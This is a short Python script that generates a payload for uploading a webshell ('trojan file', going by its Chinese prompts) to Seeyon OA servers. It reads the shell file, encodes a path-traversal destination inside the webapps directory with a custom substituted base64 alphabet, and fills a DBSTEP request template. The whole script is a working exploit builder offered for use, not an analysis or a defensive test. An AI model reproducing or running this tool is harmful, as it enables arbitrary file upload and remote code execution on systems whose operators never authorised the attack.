#!/bin/bash python3
# -*- coding: utf-8 -*-

import os

payload = """DBSTEP V3.0     {0}             0               {1}             DBSTEP=OKMLlKlV
OPTION=S3WYOSWLBSGr
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
CREATEDATE=wUghPB3szB3Xwg66
RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
originalFileId=wV66
originalCreateDate=wUghPB3szB3Xwg66
FILENAME={2}
needReadFile=yRWZdAS6
originalCreateDate=wLSGP4oEzLKAz4=iz=66
{3}6e4f045d4b8506bf492ada7e3390d7ce"""

# 路径加密
def pathEncrypt(path=r'..\..\..\ApacheJetspeed\webapps\seeyon\test666666.jsp'):
    import base64
    a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
    b = "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6"
    out = ''
    str = base64.b64encode(path.encode()).decode()
    for i in str:
        out += b[a.index(i)]
    return out

shell_path = ''
shell = ''
shell_length = ''
content_length = ''
file_name=''

shell_path = input("待上传木马文件path：")

if shell_path:
    try:
        with open(shell_path, 'r', encoding='utf-8') as f:
            shell = f.read()
            shell_length = os.path.getsize(f.name)
    except Exception as e:
        print(e)
else:
    print('no shell_path input, exit!')
    exit(0)

file_name = input(r"上传路径（默认为'..\..\..\ApacheJetspeed\webapps\seeyon\test666666.jsp'）：")

file_name = pathEncrypt(file_name) if file_name else pathEncrypt()

content_length = str(len(file_name)+283)

payload = payload.format(content_length, shell_length, file_name, shell)

print("The payload is :\n\n" + payload)
